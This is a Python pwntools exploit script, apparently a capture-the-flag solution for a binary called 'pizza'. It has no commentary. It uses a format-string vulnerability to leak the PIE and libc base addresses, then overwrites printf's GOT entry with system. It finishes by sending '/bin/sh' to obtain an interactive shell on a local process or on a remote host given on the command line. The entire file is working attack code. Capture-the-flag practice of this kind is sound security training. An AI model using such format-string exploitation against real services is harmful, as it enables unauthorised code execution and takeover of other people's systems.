from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./pizza"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+529
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    #offset = 
    # leaks
    # libc = 1      []
    # text = 49     [offset -4489]
    log.info("binary loaded")
    pp.recvuntil(b">")

    log.info("leaking the piebase")
    for i in range(1,3):
        pp.sendline(b"12")
        pp.recvuntil(b":")
        pp.sendline(f"%49$p".encode())
        pp.recvuntil(b">")

    pp.sendline(f"%1$p".encode())
    elf.address = int(pp.recvuntil(b"):").split(b"\n")[1], 16) - 4489
    log.success(f"pie base extracted {hex(elf.address)}")

    pp.sendline(b"y")

    pp.recvuntil(b">")

    log.info("leaking libc")
    for i in range(1,3):
        pp.sendline(b"12")
        pp.recvuntil(b":")
        pp.sendline( b"%7$sAAAA" + p64(elf.got.puts))
        pp.recvuntil(b">")

    pp.sendline(b"%7$p%6$p" + p64(elf.got.putchar))
    putsraw = pp.recvuntil(b"):").split(b"AAAA")[1].split(b"\n")[1]
    libc.address = u64(putsraw + ( (8 - len(putsraw) )* b"\x00" )) - libc.sym.puts
    pp.sendline(b"y")
    log.success(f"libc base {hex(libc.address)}")

    lsb = u32(p64(libc.sym.system)[0:4])
    log.info(f"system injection {hex(lsb)}")
    payload = fmtstr_payload(6, {elf.got.printf: libc.sym.system}, write_size="short")

    log.info(f"injecting system, payload length {len(payload)}")
    pp.recvuntil(b">")

    for i in range(1,3):
        pp.sendline(b"12")
        pp.recvuntil(b":")
        pp.sendline(payload)
        pp.recvuntil(b">")

    pp.sendline(payload)

    pp.sendline(b"y")
    log.info("shell")
    for i in range(1,3):
        pp.sendline(b"12")
        pp.sendline( b"/bin/sh")

    pp.sendline(b"/bin/sh" )
    
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
